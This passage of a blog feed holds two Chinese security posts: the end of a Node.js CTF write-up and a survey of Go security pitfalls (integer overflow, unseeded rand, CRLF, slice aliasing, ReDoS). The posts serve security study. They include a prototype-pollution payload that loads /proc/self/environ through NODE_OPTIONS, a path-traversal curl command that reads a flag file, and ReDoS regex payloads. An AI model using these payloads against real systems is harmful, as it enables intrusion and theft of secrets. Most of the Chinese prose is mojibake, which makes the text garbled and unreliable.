127.0.0.1');process.exit();//"</span>,</span><br><span class="line"><span class="string">"constructor.prototype.env.NODE_OPTIONS"</span>:<span class="string">"-r /proc/self/environ"</span>,</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.summershrimp.com/uploads/upload_790c9ee4c7ba0655f6129ea9eadb61bd.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_790c9ee4c7ba0655f6129ea9eadb61bd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿œç¨‹ncæ‰“é€š<br><img src="https://hackmd.summershrimp.com/uploads/upload_09312849190b675cac32392d97e0db1c.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_09312849190b675cac32392d97e0db1c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç”±äºé¢˜ç›®æ‰“ä¸€æ¬¡åæ•°æ®åº“å°±ä¼šæŠ¥é”™,åªè¦å®Œæˆç¬¬ä¸€æ­¥ä»¥adminç™»å½•çš„é€‰æ‰‹åº”è¯¥éƒ½èƒ½åœ¨ç™»å½•æ—¶çœ‹åˆ°ä»–äººçš„payloadã€‚æ‰€ä»¥å¯èƒ½ä¼šæœ‰è¹­è½¦ã€‚</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ€»çš„æ¥è¯´è¿™é“é¢˜éš¾åº¦ä¸€èˆ¬ã€‚ä½†æ˜¯åˆ©ç”¨ç‚¹å…¶å®éƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„ã€‚æ‰€ä»¥å€¼å¾—åˆ†äº«ä¸€ä¸‹ã€‚ä¹Ÿæé†’æˆ‘ä»¬ä»å¼€å‘çš„è§’åº¦ä¸Šï¼Œä¸€æ–¹é¢åœ¨æ‰“å¼€äº†jsonä¸­é—´ä»¶æˆ–è€…<code>{extendedï¼š true}</code>çš„æƒ…å†µä¸‹ä¸€å®šè¦æ³¨æ„ä¼ å‚ç±»å‹ã€‚å¦ä¸€æ–¹é¢ä¹Ÿæ˜¯é¿å…ä½¿ç”¨ç”¨é‡ä½çš„nodeä¾èµ–,å¦åˆ™å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›æœªä¿®å¤å®Œå…¨æˆ–è€…ç”šè‡³æ ¹æœ¬ä¸ä¿®å¤çš„ä»£ç ã€‚æ¯”å¦‚ æ­¤å¤„æ²¡ä¿®å¤å®Œå…¨çš„shvl çš„æƒ…å½¢ç”šè‡³éƒ½ä¸æ˜¯ä¸ªä¾‹ã€‚ä¹‹å‰ posixæŒ–åˆ°çš„flat ä¾èµ– åŸå‹é“¾æ±¡æŸ“ç¬¬ä¸€æ¬¡ä¿®å¤çš„ç‰ˆæœ¬è·Ÿè¿™é‡Œå‡ºç°äº†å‡ ä¹ä¸€æ ·çš„é—®é¢˜,å¯¼è‡´å¯ä»¥<code>prototype</code>ç»•è¿‡ã€‚ã€‚ã€‚</p><p>æœ€åå°±æ˜¯å…³äºRCEã€‚ nodejsé‡Œæƒ³å€Ÿç”±æ¼æ´è¾¾æˆRCEç¡®å®ä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ï¼ŒåŸºæœ¬ä¸Šå°±å‚æ•°æ³¨å…¥ï¼Œæˆ–è€…åŸå‹é“¾æ±¡æŸ“ + gadget/ AST injection. è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåŸå‹é“¾æ±¡æŸ“å§‹ç»ˆæ˜¯nodejsæ¼æ´çƒ­é—¨çš„åŸå› ã€‚ ä¹‹å‰æ³¨æ„åˆ°posixä»–ä»¬å·²ç»ç ”ç©¶å‡ºäº†è‡ªåŠ¨æŒ–æ˜åŸå‹é“¾æ±¡æŸ“çš„å·¥å…·äº†,å±å®ç¾¡æ…•ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golangçš„ä¸€äº›å®‰å…¨é—®é¢˜</title>
      <link href="2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>å¯’å‡ä¸»è¦æ˜¯å…ˆå‡ºå®Œäº†ä¹‹å‰å¿ƒå¿ƒå¿µå¿µçš„typescript é¢˜ç›®ï¼Œä¹‹åä¸»è¦æ˜¯æŠ½ç‚¹æ—¶é—´å­¦golang.åŒå­¦æ¨èçš„ä»“åº“è®²çš„è¿˜æ˜¯å¾ˆä¸é”™çš„</p><p><a href="https://github.com/unknwon/the-way-to-go_ZH_CN" target="_blank" rel="noopener">https://github.com/unknwon/the-way-to-go_ZH_CN</a></p><p>ä»ç®€å•çš„å¼€å‘ä¸å­¦ä¹ è¿‡ç¨‹ä¸­å¯ä»¥æ„Ÿè§‰åˆ°golangçš„ç¡®éå¸¸å®‰å…¨ï¼Œå¾ˆå¤šé—®é¢˜ç”±äºä½œä¸ºå¼ºç±»å‹çš„é™æ€è¯­è¨€ï¼Œä»ç¼–è¯‘è¿‡ç¨‹å°±èƒ½é˜²æ­¢ä¸å®‰å…¨çš„æ“ä½œã€‚å› æ­¤å¤§éƒ¨åˆ†æ¼æ´äº§ç”Ÿè¿˜æ˜¯å½’ç»“äºä¾èµ–åº“ï¼ˆé€šå¸¸å·²ç»å‘å±•ä¸ºCVEæˆ–è€…issueï¼‰ä»¥åŠå¼€å‘è€…è‡ªèº«çš„æ“ä½œæ¼æ´ã€‚è¿™é‡Œå°±ä½œä¸ºå°ç»“,ç®€å•è°ˆä¸€è°ˆ</p><a id="more"></a><h2 id="interger-overflow-truncation"><a href="#interger-overflow-truncation" class="headerlink" title="interger overflow/truncation"></a>interger overflow/truncation</h2><p>golang å­˜åœ¨éå¸¸ç»å…¸çš„æ•´æ•°åè½¬/æº¢å‡ºé—®é¢˜</p><p>å¯¹æ— ç¬¦å·æ•°çš„åè½¬</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="keyword">uint32</span> = <span class="number">2147483648</span></span><br><span class="line"><span class="keyword">var</span> b <span class="keyword">uint32</span> = <span class="number">2147483648</span></span><br><span class="line"><span class="keyword">var</span> sum  =  a + b</span><br><span class="line">fmt.Println(reflect.TypeOf(sum))</span><br><span class="line">fmt.Printf(<span class="string">"Sum is : %d"</span>,sum)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//uint32</span></span><br><span class="line"><span class="comment">//Sum is : 0</span></span><br></pre></td></tr></table></figure><p>æƒ³è¦ç›´æ¥å£°æ˜ä¸€ä¸ªå¤§å°å·²ç»æº¢å‡ºçš„æ•°è‡ªç„¶ä¸ä¼šé€šè¿‡ç¼–è¯‘ï¼Œå› æ­¤å‡ºç°åè½¬çš„è¯ï¼Œä¸»è¦æ˜¯åœ¨å˜é‡çš„ç›¸åŠ è¿™æ ·çš„è®¡ç®—æ‰ä¼šä¼šå¯¼è‡´æ ‡å¿—CFä½åè½¬</p><p>æœ‰ç¬¦å·æ•°çš„æº¢å‡º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int8</span> = <span class="number">127</span></span><br><span class="line"><span class="keyword">var</span> b <span class="keyword">int8</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> sum <span class="keyword">int8</span> =  a + b</span><br><span class="line">fmt.Println(reflect.TypeOf(sum))</span><br><span class="line">fmt.Printf(<span class="string">"Sum is : %d"</span>,sum)</span><br><span class="line"><span class="comment">//int8</span></span><br><span class="line"><span class="comment">//-128</span></span><br></pre></td></tr></table></figure><p>å…·ä½“çš„å€¼å¯ä»¥çœ‹åˆ°mathåŒ…ä¸­çš„å¸¸é‡å®šä¹‰ã€‚<br><img src="https://hackmd.summershrimp.com/uploads/upload_5ffbbfdc9f0ebffa65ffa3ce5f05a35c.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_5ffbbfdc9f0ebffa65ffa3ce5f05a35c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åœ¨ç±»å‹è½¬æ¢ä¸­,ä¹Ÿä¼šå‡ºç°è¾ƒå¤§æ•´å‹å‘è¾ƒå°æ•´å‹è½¬æ¢çš„æˆªæ–­é—®é¢˜</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int16</span> = <span class="number">256</span></span><br><span class="line"><span class="keyword">var</span> b  = <span class="keyword">int8</span>(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line"><span class="comment">// 0 </span></span><br><span class="line"><span class="comment">// high-order byte is truncated</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•´å‹å®‰å…¨çš„æ£€æŸ¥ä¹Ÿå‡ºç°åœ¨äº†<a href="https://github.com/securego/gosec" target="_blank" rel="noopener">gosec</a>ä¸­ï¼Œä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„ä¾‹å­å°±æ˜¯ï¼š<code>kubectl</code>å‘½ä»¤è¡Œä¸­å‡ºç°äº†ä¸€ä¸ª<code>strconv.Atoi</code>å¯¼è‡´çš„æˆªæ–­é—®é¢˜ã€‚å½“æˆ‘ä»¬ä¼ å…¥portå‚æ•°çš„å¯¹åº”å­—ç¬¦ä¸²å,å®¹å™¨å¯åŠ¨çš„ç«¯å£è¿™ä¸€å‚æ•°ä¼šå°†ç»Atoiå¤„ç†åçš„å­—ç¬¦ä¸²è¿›è¡Œint32çš„ç±»å‹è½¬æ¢ã€‚ç”±äº64ä½ç³»ç»Ÿçš„intæ˜¯int64ç±»å‹ã€‚è½¬int32çš„è¯ä¼šå‡ºç°æ˜æ˜¾æˆªæ–­<br>å¯ä»¥ç®€åŒ–æˆä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v , _ := strconv.Atoi(<span class="string">"4294967377"</span>)</span><br><span class="line">s  := <span class="keyword">int32</span>(v)</span><br><span class="line">fmt.Println(s)</span><br><span class="line"><span class="comment">// 81</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æœ‰å¯èƒ½å¯¼è‡´81ç«¯å£çš„æœåŠ¡å¯åŠ¨ï¼Œæˆ–è€…è¢«åœæ­¢ã€‚æ‰€ä»¥ä½¿ç”¨<code>ParseInt ,ParseUInt</code>ä¼šæ¯”è¾ƒå¥½ã€‚æˆ–è€…å¯¹ç«¯å£å·è¿›è¡Œé™åˆ¶ã€‚</p><p>CTFä¸­å‡ºç°æ•´æ•°æº¢å‡ºçš„scenario ä¸€èˆ¬éƒ½æ˜¯ xx shopä¹‹ç±»çš„ã€‚é€šè¿‡é‡å¤çš„åŠ æ•°è¿›è¡Œæº¢å‡ºç„¶åé‰´æƒã€‚</p><h2 id="pseudo-rand"><a href="#pseudo-rand" class="headerlink" title="pseudo-rand"></a>pseudo-rand</h2><p>golang çš„math/rand åŒ…ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°éšæœºæ•°ç”Ÿæˆçš„å‡½æ•°å½¢å¼</p><p><img src="https://hackmd.summershrimp.com/uploads/upload_f6708f74d8bc16d6c4f6d5085e798521.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_f6708f74d8bc16d6c4f6d5085e798521.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è·Ÿè¿›ä¸€ä¸‹å‡½æ•°ä¸ç»“æ„ä½“</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> globalRand = New(&amp;lockedSource&#123;src: NewSource(<span class="number">1</span>).(*rngSource)&#125;)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSource</span><span class="params">(seed <span class="keyword">int64</span>)</span> <span class="title">Source</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rng rngSource</span><br><span class="line">rng.Seed(seed)</span><br><span class="line"><span class="keyword">return</span> &amp;rng</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°,è¿™äº›éšæœºæ•°å‡½æ•°çš„seedé»˜è®¤ä¸º1.ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸ä½¿ç”¨<code>rand.Seed()</code>ç¡®è®¤ç§å­çš„è¯ï¼Œç”Ÿæˆçš„åªæ˜¯æ‰€è°“çš„ä¼ªéšæœºæ•°ã€‚</p><p>è¿™ç§é—®é¢˜å¯èƒ½ä¼šå‡ºç°åœ¨å¼€å‘è€…ç›´æ¥ç”¨randç”Ÿæˆçš„å­—ç¬¦ä¸²ä½œä¸ºå¯†é’¥çš„åœºæ™¯ï¼Œæ¯”å¦‚ginçš„cookieçš„key.ä»è€Œå¯¼è‡´æœ¬åœ°å¤ç°ï¼Œç›´æ¥é‰´æƒã€‚</p><h2 id="go-net-http"><a href="#go-net-http" class="headerlink" title="go net/http"></a>go net/http</h2><h3 id="net-http-lt-1-11-CRLF"><a href="#net-http-lt-1-11-CRLF" class="headerlink" title="net/http &lt; 1.11 CRLF"></a>net/http &lt; 1.11 CRLF</h3><p>ä½ç‰ˆæœ¬çš„httpåº“ä¼šå¯¼è‡´CRLF.æ¯”å¦‚<code>http.NewRequest()</code>ã€‚è²Œä¼¼æ˜¯åŸæœ¬æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨ä¸€æ¬¡å‡çº§ä¸­ç–å¿½äº†å¯¼è‡´é‡æ–°å‡ºç°<br><img src="https://hackmd.summershrimp.com/uploads/upload_c155e0320b2e007aeda1c3d2f4b63b37.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_c155e0320b2e007aeda1c3d2f4b63b37.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨ä¼šçœ‹åˆ°å­˜åœ¨é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ä¼ å…¥<code>\r\n</code>çš„å­—ç¬¦</p><p>WMCTFä¸­çš„gogogoå‡ºç°è¿‡è¿™ä¸€æ¼æ´ï¼Œåˆ©ç”¨è‡ªç„¶æ˜¯é€šè¿‡CRLFå‘é€POSTè¯·æ±‚è¿›è¡Œç»•è¿‡ä¸ä¸Šä¼ ã€‚</p><h3 id="weird-stuff"><a href="#weird-stuff" class="headerlink" title="weird stuff"></a>weird stuff</h3><p>åœ¨ä¹‹å‰çš„<a href="https://ctftime.org/event/1050" target="_blank" rel="noopener">justCTF</a>ä¸­ï¼Œå‡ºç°äº†ä¸€é“goé¢˜ã€‚é¢˜ç›®åŸæœ¬çš„æ¼æ´æ˜¯ç”±å‡ºé¢˜äººå‘ç°çš„ä¸€ä¸ªissue<a href="https://github.com/golang/go/issues/40940" target="_blank" rel="noopener">https://github.com/golang/go/issues/40940</a> åŠ ä¸Šå…¶å¯¹fileServerä¸€äº›ä»£ç çš„é­”æ”¹ç»„åˆçš„ã€‚</p><p>ç®€å•é™ˆè¿°ä¸‹çš„è¯ï¼Œé¢˜ç›®æä¾›äº†ä¸€ä¸ªgo httpèµ·çš„FileServer</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.Handle(<span class="string">"/"</span>, http.FileServer(http.Dir(<span class="string">"/tmp"</span>)))</span><br></pre></td></tr></table></figure><p>flagå°±åœ¨å…¶æä¾›æ–‡ä»¶æœåŠ¡çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œä½†æ˜¯ï¼Œå‡ºé¢˜äººåŠ ä¸Šäº†webæœåŠ¡çš„flagè·¯ç”±,ä»è€Œä½¿å¾—æˆ‘ä»¬æ²¡æ³•é€šè¿‡ç›´æ¥è®¿é—®<code>/flag</code>æ¥è·å–æ–‡ä»¶ã€‚è€Œæ˜¯å¾—åˆ°<code>/flag</code>è·¯ç”±çš„å›æ˜¾ã€‚</p><p>å‡ºé¢˜äººçš„æ„å›¾æ˜¯åˆ©ç”¨å…¶æŒ–æ˜åˆ°çš„è¿™ä¸ªæ¼æ´ï¼Œé€ æˆé”™è¯¯çš„æ–‡ä»¶è¯»å–èŒƒå›´ã€‚é€šè¿‡è®¿é—®å…¶ä»–æ–‡ä»¶è¶Šç•Œè¯»åˆ°flag.(httpçš„Fileserveråœ¨æˆ‘ä»¬è®¿é—®æ—¶ï¼Œä¼šå…ˆæ ¹æ®æˆ‘ä»¬è®¿é—®çš„urlè¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼Œæœç»è·¯å¾„ç©¿è¶Šçš„url,ä¹‹åè¿›è¡Œæ–‡ä»¶è¯»å–è¿”å›ç»™ç”¨æˆ·)</p><p>ä½†æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„æ—¶ï¼Œæ¯”èµ›ä¸­å‡ºç°äº†ä¸€ä¸ªéé¢„æœŸè¯»flagçš„æ–¹å¼<br><code>curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag</code></p><p>ç®€å•è¯´å°±æ˜¯ç”¨CONNECTè¯·æ±‚+è·¯å¾„ç©¿è¶Šçš„urlè¯»å–åˆ°äº†æ–‡ä»¶ã€‚æˆ‘ä»¬çœ‹çœ‹æºç æ˜¯æ€ä¹ˆå¤„ç†çš„<br><img src="https://hackmd.summershrimp.com/uploads/upload_f9abcabe3b0a17bac5f8e41a586d74ab.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_f9abcabe3b0a17bac5f8e41a586d74ab.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¦‚æœæ˜¯CONNECTæ–¹å¼è¯·æ±‚ï¼Œå°±ä¸ä¼šå¤„ç†urlä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚å¯¼è‡´ç›´æ¥è¯»å–flag.å…¶ä»–çš„è¯·æ±‚æ–¹æ³•éƒ½ä¼šåœ¨<code>cleanPath</code>ä¸­è¢«å¤„ç†url</p><p>ç®—æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ã€‚ä¸è¿‡golang1.16ä¼¼ä¹å·²ç»å¤„ç†äº†ã€‚ä½†æ˜¯åŒ…æ‹¬æˆ‘åœ¨å†…çš„å¤§éƒ¨åˆ†åº”è¯¥è¿˜æ˜¯ä½¿ç”¨çš„go1.15åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿˜æ˜¯å€¼å¾—æ³¨æ„çš„</p><h2 id="feature-of-slice"><a href="#feature-of-slice" class="headerlink" title="feature of slice"></a>feature of slice</h2><p>ä¹‹å‰åœ¨åšbuuä¸Šçš„roarCTFæ—¶é‡åˆ°ä¸€é“goé¢˜ï¼Œå…¶ä¸­ä¸€ä¸ªåˆ©ç”¨ç‚¹æ¥è‡ªConfidence CTF,å…¶ä¸­ç”¨åˆ°äº†golang sliceçš„ä¸€ä¸ªfeature</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="built_in">make</span>([]<span class="keyword">uint64</span>, <span class="number">0</span>)</span><br><span class="line">a = <span class="built_in">append</span>(a, <span class="number">1</span>)</span><br><span class="line">a = <span class="built_in">append</span>(a, <span class="number">2</span>)</span><br><span class="line">a = <span class="built_in">append</span>(a, <span class="number">3</span>)</span><br><span class="line">b := <span class="built_in">append</span>(a, <span class="number">4</span>)</span><br><span class="line">c := <span class="built_in">append</span>(a, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">fmt.Println(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">//result:</span></span><br><span class="line"><span class="comment">//[1 2 3]</span></span><br><span class="line"><span class="comment">//[1 2 3 5]</span></span><br><span class="line"><span class="comment">//[1 2 3 5]</span></span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ç›´è§‰æ¥è¯´ï¼Œbè¿™é‡Œåº”è¯¥æ˜¯<code>[1,2,3,4]</code>,ä½†å®é™…ä¸Šå´æ˜¯<code>[1,2,3,5]</code><br>è¿™å°±ä¸golangçš„sliceä¹Ÿå°±æ˜¯åˆ‡ç‰‡çš„ç»“æ„ç›¸å…³äº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">    array unsafe.Pointer <span class="comment">// ptr</span></span><br><span class="line">    <span class="built_in">len</span>   <span class="keyword">int</span></span><br><span class="line">    <span class="built_in">cap</span>   <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.summershrimp.com/uploads/upload_07c51c4e5face9078a0c61cadce82aa7.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_07c51c4e5face9078a0c61cadce82aa7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>sliceç»“æ„ä¸­çš„capæ˜¯æŒ‰2çš„å€æ•°æ‰©å®¹çš„ã€‚æ‰€ä»¥è¯´å½“æˆ‘ä»¬<code>append(3)</code>æ—¶ä¼šå‘ç”Ÿç¬¬ä¸€æ¬¡æ‰©å®¹ï¼Œæ­¤æ—¶lenä¸º3ï¼Œcapä¸º<code>2*2=4</code>.<br>æ‰§è¡Œ<code>b := append(a, 4)</code>æ—¶ï¼Œæˆ‘ä»¬çš„4ä¼šè¢«æ”¾åœ¨æŒ‡é’ˆptrçš„ç¬¬å››ä¸ªä½ç½®ã€‚ç„¶åè¿”å›ptr len=4 cap=4ç»™bã€‚ä¸è¿‡è¿™å¹¶æ²¡æœ‰æ”¹å˜açš„ç»“æ„ï¼ˆsliceåªæ˜¯æŒ‡å‘å†…å­˜çš„æŒ‡é’ˆï¼‰ä¹‹åè¿›è¡Œ<code>c := append(a, 5)</code>æ—¶ï¼Œç”±äºaæ²¡å˜ï¼Œæ–°å…ƒç´ åªä¼šè¦†ç›–ä¹‹å‰bé‚£æ”¾ä¸Šçš„4.</p><p>é‚£ä¸€é“é¢˜ç›®å°±æ˜¯åˆ©ç”¨è¿™ç‚¹ï¼Œå¯ä»¥é€šè¿‡å…ˆbegä¸‰æ¬¡æ„é€ å‡ºlen=3,cap=4çš„åˆ‡ç‰‡ï¼Œé€šè¿‡é¢˜ç›®ä¸­ä¸€ä¸ªappendè¶…å¤§éšæœºæ•°çš„æœºä¼šï¼Œåœ¨ä¸‹ä¸€æ¬¡begæ—¶è¾¾æˆå…ƒç´ è¦†ç›–ã€‚</p><p>è¿™ä¸ªå¯ä»¥ç®—æ˜¯sliceçš„feature,è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚</p><h2 id="reDOS"><a href="#reDOS" class="headerlink" title="reDOS"></a>reDOS</h2><p>åŸæœ¬æ˜¯ä»¥ä¸ºgolangä¸å­˜åœ¨reDOSçš„é—®é¢˜çš„ã€‚å½“åˆé˜…è¯»lmt-swallowçš„æ–‡ç« æ—¶ä¹Ÿçœ‹åˆ°ä»–æåˆ°golangæœ‰linear time matchingã€‚ ä¸è¿‡åæ¥å‘ç°è¿˜æ˜¯æœ‰é€”å¾„çš„ã€‚</p><p>å½“ç„¶ï¼ŒreDOSä¸»è¦è¿˜æ˜¯åœ¨jsé‡Œå½±å“æ¯”è¾ƒå¤§ï¼Œå› ä¸ºå…¶äº‹ä»¶é˜Ÿåˆ—é˜»å¡å¯¹äºwebæœåŠ¡çš„å½±å“æ˜¯å·¨å¤§çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹å…¶ä»–çš„DOSå½±å“å¯èƒ½å°±è¾ƒå°ã€‚ç”¨nginxåšä¸ªå¤„ç†åŸºæœ¬å°±æ²¡æœ‰å½±å“ã€‚ä¸è¿‡ï¼Œå¦‚æœæ˜¯ä»¥<code>Blind regex injection</code>ä¸ºç›®çš„è€ƒè™‘reDOSçš„è¯ï¼Œå°±å¦å½“åˆ«è®ºäº†ã€‚</p><p>å›åˆ°golangä¸Šã€‚golangä½¿ç”¨çš„æ­£åˆ™å¼•æ“æ˜¯re2ã€‚ä½†æ˜¯ç”¨çš„æ˜¯æ— å›æº¯æœºåˆ¶(DFA)ã€‚<br>æ‰€ä»¥ä¹‹å‰çš„payloadå¦‚<code>^(?=(PAYLOAD))((.*)*)*salt$</code>å°±æ— æ•ˆäº†</p><p>ä½†æ˜¯,é€šè¿‡å…¶ä»–æ–¹æ³•åˆ¶é€ å»¶æ—¶ä»ç„¶æ˜¯å¯è¡Œçš„ã€‚æ¯”å¦‚re2å¯¹äº<code>{n}</code>è¿™æ ·çš„æ­£åˆ™ï¼Œnå­˜åœ¨æœ‰ä¸Šé™1000ï¼Œä¸”å¯¹äºDFAçŠ¶æ€æ•°æ²¡æœ‰é™åˆ¶.æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸æ–­é‡å¤<code>(.?){1000}</code>æ¥åˆ¶é€ è¶³å¤Ÿçš„DFAçŠ¶æ€è¿›è¡Œä¸€å®šç¨‹åº¦ä¸Šçš„å»¶æ—¶</p><p>reDOSå…¶å®ä¸€ç›´æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹,é™¤äº†å–œé—»ä¹è§çš„nodejs,å‰ç«¯ä¸­xssä¹Ÿå¯ä»¥å¯¼è‡´è¿™ä¸ªé—®é¢˜ï¼Œä»è€Œxsleak 